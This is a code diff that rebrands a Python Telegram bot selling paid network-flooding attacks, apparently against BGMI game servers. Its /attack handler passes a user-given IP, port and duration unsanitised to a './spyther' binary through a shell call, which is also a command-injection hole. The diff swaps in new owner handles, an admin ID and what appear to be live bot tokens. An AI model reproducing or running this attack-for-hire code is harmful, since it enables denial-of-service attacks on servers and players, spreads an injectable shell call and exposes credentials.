@@ -7,10 +7,10 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7885401612:AAEMW6lATvX0HU7krdpSP2DacpKrt7s_wyI')
+bot = telebot.TeleBot('7170069588:AAHimfx8swOPwNm0WceC1Xrr573pKo2swmM')
 
 # Admin user IDs
-admin_id = ["5193826370"]
+admin_id = ["5993665056"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -212,7 +212,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 {username} 💎\n\n🟢 𝐘𝐎𝐔𝐑 A𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🟢\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PRIVATE \n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n⏸️ 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} 𝐖𝐚𝐢𝐭 𝐓𝐡𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧 \n\nSEND FEEDBACK TO @spyther\nNO FEEDBACK YOUR ATTACK WILL BE BLOCKED BY SMOKEY MODS"
+    response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 {username} 💎\n\n🟢 𝐘𝐎𝐔𝐑 A𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🟢\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PRIVATE \n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n⏸️ 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} 𝐖𝐚𝐢𝐭 𝐓𝐡𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧 \n\nSEND FEEDBACK TO @SUKUNAA_XD\nNO FEEDBACK YOUR ATTACK WILL BE BLOCKED BY SMOKEY MODS"
     bot.reply_to(message, response, reply_markup=get_inline_keyboard())
 
 # Dictionary to store the last time each user ran the / command
@@ -248,7 +248,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./spyther {target} {port} {time} 800"
                 subprocess.run(full_command, shell=True)
-                response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO @spyther"
+                response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO @SUKUNAA_XD"
         else:
             response = "⚠️ Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ ⚠️\n\n✅ Usᴀɢᴇ : /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴅᴜʀᴀᴛɪᴏɴ>\n\n✅ Fᴏʀ Exᴀᴍᴘʟᴇ: /attack 127.0.0.1 8700 200"
     else:
@@ -289,7 +289,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By Spythet BOT
+ By  BOT
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -342,7 +342,7 @@ def welcome_plan(message):
 ---
 
 🚀 <b>Join Us for More!</b>  
-📩 <a href="https://t.me/smokeymods">Contact Owner</a> 💥
+📩 <a href="https://t.me/+E376k1R35Xk3ZjA1">Contact Owner</a> 💥
 '''
 
     bot.reply_to(message, response, parse_mode='HTML', reply_markup=get_inline_keyboard())
@@ -358,7 +358,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By @spyther BOT
+By @SUKUNAA_XD BOT
 '''
     bot.reply_to(message, response, reply_markup=get_inline_keyboard())
 
@@ -395,4 +395,4 @@ while True:
     except Exception as e:
         print(e)
 
-#By @spyther
+#By 
